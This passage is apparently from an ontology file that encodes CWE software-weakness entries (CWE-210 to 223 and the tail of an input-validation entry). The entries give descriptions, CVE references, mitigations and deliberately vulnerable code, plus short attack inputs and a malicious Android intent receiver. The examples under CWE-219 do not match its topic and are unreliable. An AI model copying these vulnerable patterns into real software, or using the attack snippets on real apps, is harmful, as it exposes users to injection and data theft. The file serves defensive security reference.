$homepage = $_GET['homepage'];
echo \"Birthday: $birthday<br>Homepage: <a href=$homepage>click here</a>\"
The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with <script> tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:

(attack code)
 
2009-01-09--
If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism.

Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible."^^xsd:string, 
                 rdfs:comment "Example 4
This function attempts to extract a pair of numbers from a user-supplied string.

(bad code)
Example Language: C 
void parse_data(char *untrusted_input){
int m, n, error;
error = sscanf(untrusted_input, \"%d:%d\", &m, &n);
if ( EOF == error ){
die(\"Did not specify integer value. Die evil hacker!\\n\");
}
/* proceed assuming n and m are initialized correctly */ 
}
This code attempts to extract two integer values out of a formatted, user-supplied input. However, if an attacker were to provide an input of the form:

(attack code)
 
123:
then only the m variable will be initialized. Subsequent use of n may result in the use of an uninitialized variable (CWE-457)."^^xsd:string, 
                 rdfs:comment "Example 5
The following example takes a user-supplied value to allocate an array of objects and then operates on the array.

(bad code)
Example Language: Java 
private void buildList ( int untrustedListSize ){
if ( 0 > untrustedListSize ){
die(\"Negative value supplied for list size, die evil hacker!\");
}
Widget[] list = new Widget [ untrustedListSize ];
list[0] = new Widget();
}
This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown."^^xsd:string, 
                 rdfs:comment "Example 6
This application has registered to handle a URL when sent an intent:

(bad code)
Example Language: Java 

... 
IntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);
... 

public class UrlHandlerReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
if(\"com.example.URLHandler.openURL\".equals(intent.getAction())) {
String URL = intent.getStringExtra(\"URLToOpen\");
int length = URL.length();

... 
}
}
}
The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: High"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Fuzz Tester
Framework-based Fuzzer
Cost effective for partial coverage:
Host Application Interface Scanner
Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself."^^xsd:string
                 
                 fuzzing  ""^^xsd:string,
     
     Annotations: rdfs:comment "Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow."^^xsd:string, 
                 rdfs:comment "Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained."^^xsd:string, 
                 rdfs:comment "If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602)."^^xsd:string, 
                 rdfs:comment "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.
Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string, 
                 rdfs:comment "When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so."^^xsd:string, 
                 rdfs:comment "When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Modify Memory"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

Some instances of improper input validation can be detected using automated static analysis.
A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.
Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes."^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

When custom input validation is required, such as when enforcing business rules, manual analysis is necessary to ensure that the validation is properly implemented."^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Focused Manual Spotcheck - Focused manual analysis of source
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."^^xsd:string, 
                 rdfs:comment "Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."^^xsd:string
                 
                 testing  ""^^xsd:string
    
    
Individual: CWE-210_Information_Exposure_Through_Self-generated_Error_Message

    Annotations: 
        rdfs:comment "The software identifies an error condition and creates its own diagnostic or error messages that contain sensitive information."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1016_Limit_Exposure,
     
     Annotations: rdfs:comment "Infoleak of sensitive information in error message (physical access required)."^^xsd:string
                 
                 references  CVE-2005-1745,
     ID  "210"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Compilation or Build Hardening
Debugging information should not make its way into a production release."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Debugging information should not make its way into a production release."^^xsd:string
                 
                 build_and_compilation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The following code uses custom configuration files for each user in the application. It checks to see if the file exists on the system before attempting to open and use the file. If the configuration file does not exist, then an error is generated, and the application exits.

(bad code)
Example Language: Perl 
$uname = GetUserInput(\"username\");


# avoid CWE-22, CWE-78, others. 
if ($uname !~ /^\\w+$/)
{
ExitError(\"Bad hacker!\") ;
}

$filename = \"/home/myprog/config/\" . $uname . \".txt\";
if (!(-e $filename))
{
ExitError(\"Error: $filename does not exist\");
}
If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that is not associated with a configuration file, an attacker could get this pathname from the error message. It could then be used to exploit path traversal, symbolic link following, or other problems that may exist elsewhere in the application."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Compilation or Build Hardening
Debugging information should not make its way into a production release."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Debugging information should not make its way into a production release."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-211_Information_Exposure_Through_Externally-Generated_Error_Message

    Annotations: 
        rdfs:comment "Functional Areas:
Error Handling"^^xsd:string,
        rdfs:comment "Relationship:
This is inherently a resultant vulnerability from a weakness within the product or an interaction error."^^xsd:string,
        rdfs:comment "The software performs an operation that triggers an external diagnostic or error message that is not directly generated by the software, such as an error generated by the programming language interpreter that the software uses. The error can contain sensitive system information."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1016_Limit_Exposure,
     
     Annotations: rdfs:comment "Improper handling of filename request with trailing \"/\" causes multiple consequences, including information leak in Visual Basic error message."^^xsd:string
                 
                 references  CVE-2004-1101,
     
     Annotations: rdfs:comment "Single \"'\" inserted into SQL query leads to invalid SQL query execution, triggering full path disclosure. Possibly resultant from more general SQL injection issue."^^xsd:string
                 
                 references  CVE-2004-1579,
     
     Annotations: rdfs:comment "chain: product does not protect against direct request of an include file, leading to resultant path disclosure when the include file does not successfully execute."^^xsd:string
                 
                 references  CVE-2004-1581,
     
     Annotations: rdfs:comment "Various invalid requests lead to information leak in verbose error messages describing the failure to instantiate a class, open a configuration file, or execute an undefined function."^^xsd:string
                 
                 references  CVE-2005-0433,
     
     Annotations: rdfs:comment "invalid parameter triggers a failure to find an include file, leading to infoleak in error message."^^xsd:string
                 
                 references  CVE-2005-0443,
     
     Annotations: rdfs:comment "chain: product does not protect against direct request of a library file, leading to resultant path disclosure when the file does not successfully execute."^^xsd:string
                 
                 references  CVE-2005-0459,
     ID  "211"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "PHP applications are often targeted for having this issue when the PHP interpreter generates the error outside of the application's control. However, other languages/environments exhibit the same issue."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Compilation or Build Hardening
Debugging information should not make its way into a production release."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Debugging information should not make its way into a production release."^^xsd:string
                 
                 build_and_compilation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Handle exceptions internally and do not display errors containing potentially sensitive information to a user. Create default error pages if necessary."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Compilation or Build Hardening
Debugging information should not make its way into a production release."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Debugging information should not make its way into a production release."^^xsd:string, 
                 rdfs:comment "The best way to prevent this weakness during implementation is to avoid any bugs that could trigger the external error message. This typically happens when the program encounters fatal errors, such as a divide-by-zero. You will not always be able to control the use of error pages, and you might not be using a language that handles exceptions."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     languages  "PHP"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Configure the application's environment in a way that prevents errors from being generated. For example, in PHP, disable display_errors."^^xsd:string
                 
                 system_configuration  ""^^xsd:string,
     weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-212_Improper_Cross-boundary_Removal_of_Sensitive_Data

    Annotations: 
        rdfs:comment "Relationship:
There is a close association between CWE-226 and CWE-212. The difference is partially that of perspective. CWE-226 is geared towards the final stage of the resource lifecycle, in which the resource is deleted, eliminated, expired, or otherwise released for reuse. Technically, this involves a transfer to a different control sphere, in which the original contents of the resource are no longer relevant. CWE-212, however, is intended for sensitive data in resources that are intentionally shared with others, so they are still active. This distinction is useful from the perspective of the CWE research view (CWE-1000)."^^xsd:string,
        rdfs:comment "Relationship:
This entry is intended to be different from resultant information leaks, including those that occur from improper buffer initialization and reuse, improper encryption, interaction errors, and multiple interpretation errors. This entry could be regarded as a privacy leak, depending on the type of information that is leaked."^^xsd:string,
        rdfs:comment "Resources that may contain sensitive data include documents, packets, messages, databases, etc. While this data may be useful to an individual user or small set of users who share the resource, it may need to be removed before the resource can be shared outside of the trusted group. The process of removal is sometimes called cleansing or scrubbing.

For example, software that is used for editing documents might not remove sensitive data such as reviewer comments or the local pathname where the document is stored. Or, a proxy might not remove an internal IP address from headers before making an outgoing request to an Internet site."^^xsd:string,
        rdfs:comment "Terminology:
The terms \"cleansing\" and \"scrubbing\" have multiple uses within computing. In information security, these are used for the removal of sensitive data, but they are also used for the modification of incoming/outgoing data so that it conforms to specifications."^^xsd:string,
        rdfs:comment "The software uses a resource that contains sensitive data, but it does not properly remove that data before it stores, transfers, or shares the resource with actors in another control sphere."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     
     Annotations: rdfs:comment "NAT feature in firewall leaks internal IP addresses in ICMP error messages."^^xsd:string
                 
                 references  CVE-2002-0704,
     
     Annotations: rdfs:comment "Some image editors modify a JPEG image, but the original EXIF thumbnail image is left intact within the JPEG. (Also an interaction error)."^^xsd:string
                 
                 references  CVE-2005-0406,
     
     Annotations: rdfs:comment "Windows ::DATA Alternate Data Stream"^^xsd:string
                 
                 related_attack_patterns  CAPEC-168,
     ID  "212"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Sensitive data may be exposed to an unauthorized actor in another control sphere. This may have a wide range of secondary consequences which will depend on what data is exposed. One possibility is the exposure of system data allowing an attacker to craft a specific, more effective attack."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "This code either generates a public HTML user information page or a JSON response containing the same user information.

(bad code)
Example Language: PHP 

// API flag, output JSON if set 
$json = $_GET['json']
$username = $_GET['user']
if(!$json)
{
$record = getUserRecord($username);
foreach($record as $fieldName => $fieldValue)
{
if($fieldName == \"email_address\") {

// skip displaying user emails 
continue;
}
else{
writeToHtmlPage($fieldName,$fieldValue);
}
}
}
else
{
$record = getUserRecord($username);
echo json_encode($record);
}
The programmer is careful to not display the user's e-mail address when displaying the public HTML page. However, the e-mail address is not removed from the JSON response, exposing the user's e-mail address."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Avoid errors related to improper resource shutdown or release (CWE-404), which may leave the sensitive data within the resource if it is in an incomplete state."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
Effectiveness: Defense in Depth
Note: This makes it easier to spot places in the code where data is being used that is unencrypted."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Clearly specify which information should be regarded as private or sensitive, and require that the product offers functionality that allows the user to cleanse the sensitive information from the resource before it is published or exported to other parties."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-214_Information_Exposure_Through_Process_Environment

    Annotations: 
        rdfs:comment "A process is invoked with sensitive arguments, environment variables, or other elements that can be seen by other processes on the operating system."^^xsd:string,
        rdfs:comment "Affected Resources:
System Process"^^xsd:string,
        rdfs:comment "Many operating systems allow a user to list information about processes that are owned by other users. This information could include command line arguments or environment variable settings. When this data contains sensitive information such as credentials, it might allow other users to launch an attack against the software or related resources."^^xsd:string,
        rdfs:comment "Research Gap:
Under-studied, especially environment variables."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1016_Limit_Exposure,
     
     Annotations: rdfs:comment "PGP passphrase provided as command line argument."^^xsd:string
                 
                 references  CVE-1999-1270,
     
     Annotations: rdfs:comment "username/password on command line allows local users to view via \"ps\" or other process listing programs"^^xsd:string
                 
                 references  CVE-2001-1565,
     
     Annotations: rdfs:comment "Kernel race condition allows reading of environment variables of a process that is still spawning."^^xsd:string
                 
                 references  CVE-2004-1058,
     
     Annotations: rdfs:comment "username/password on command line allows local users to view via \"ps\" or other process listing programs"^^xsd:string
                 
                 references  CVE-2004-1948,
     
     Annotations: rdfs:comment "password passed on command line"^^xsd:string
                 
                 references  CVE-2005-1387,
     
     Annotations: rdfs:comment "password passed on command line"^^xsd:string
                 
                 references  CVE-2005-2291,
     ID  "214"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "In the example below, the password for a keystore file is read from a system property.

(bad code)
Example Language: Java 
String keystorePass = System.getProperty(\"javax.net.ssl.keyStorePassword\");
if (keystorePass == null) {
System.err.println(\"ERROR: Keystore password not specified.\");
System.exit(-1);
}

...
If the property is defined on the command line when the program is invoked (using the -D... syntax), the password may be displayed in the OS process list."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-219_Sensitive_Data_Under_Web_Root

    Annotations: 
        rdfs:comment "Background Details: 
Various Unix FTP servers require a password file that is under the FTP root, due to use of chroot."^^xsd:string,
        rdfs:comment "The application stores sensitive data under the web document root with insufficient access control, which might make it accessible to untrusted parties."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Database file under web root."^^xsd:string
                 
                 references  CVE-2002-0943,
     
     Annotations: rdfs:comment "Username/password in data file under web root."^^xsd:string
                 
                 references  CVE-2002-1449,
     
     Annotations: rdfs:comment "Database file under web root."^^xsd:string
                 
                 references  CVE-2005-1645,
     
     Annotations: rdfs:comment "Data file under web root."^^xsd:string
                 
                 references  CVE-2005-1835,
     
     Annotations: rdfs:comment "Data file under web root."^^xsd:string
                 
                 references  CVE-2005-2217,
     ID  "219"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
Evidence of privilege change:

Example Language: C  /* (bad code) */
seteuid(0);
/* do some stuff */ 

seteuid(getuid());
(bad code)
Example Language: Java 
AccessController.doPrivileged(new PrivilegedAction() {
public Object run() {

// privileged code goes here, for example: 
System.loadLibrary(\"awt\");
return null;
// nothing to return 
}"^^xsd:string, 
                 rdfs:comment "Example 2
This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes.

Example Language: Java  /* (bad code) */
Intent intent = new Intent();
intent.setAction(\"com.example.BackupUserData\");
intent.setData(file_uri);
intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);
sendBroadcast(intent);
(attack code)
Example Language: Java 
public class CallReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
Uri userData = intent.getData();
stealUserData(userData);
}
}
Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "Avoid storing information under the web root directory."^^xsd:string, 
                 rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Access control permissions should be set to prevent reading/writing of sensitive files inside/outside of the web directory."^^xsd:string, 
                 rdfs:comment "Avoid storing information under the web root directory."^^xsd:string
                 
                 system_configuration  ""
    
    
Individual: CWE-220_Sensitive_Data_Under_FTP_Root

    Annotations: 
        rdfs:comment "Background Details
Various Unix FTP servers require a password file that is under the FTP root, due to use of chroot."^^xsd:string,
        rdfs:comment "The application stores sensitive data under the FTP document root with insufficient access control, which might make it accessible to untrusted parties."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "220"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Access control permissions should be st to prevent reading/writing of sensitive files inside/outside of the FTP directory."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Access control permissions should be st to prevent reading/writing of sensitive files inside/outside of the FTP directory."^^xsd:string, 
                 rdfs:comment "Avoid storing information under the FTP root directory."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-223_Omission_of_Security-relevant_Information

    Annotations: 
        rdfs:comment "The application does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1009_Audit,
     
     Annotations: rdfs:comment "SSH server (sshd2) before 2.0.12 does not properly record login attempts if the connection is closed before the maximum number of tries, allowing a remote attacker to guess the password without showing up in the audit logs."^^xsd:string
                 
                 references  CVE-1999-1029,
     
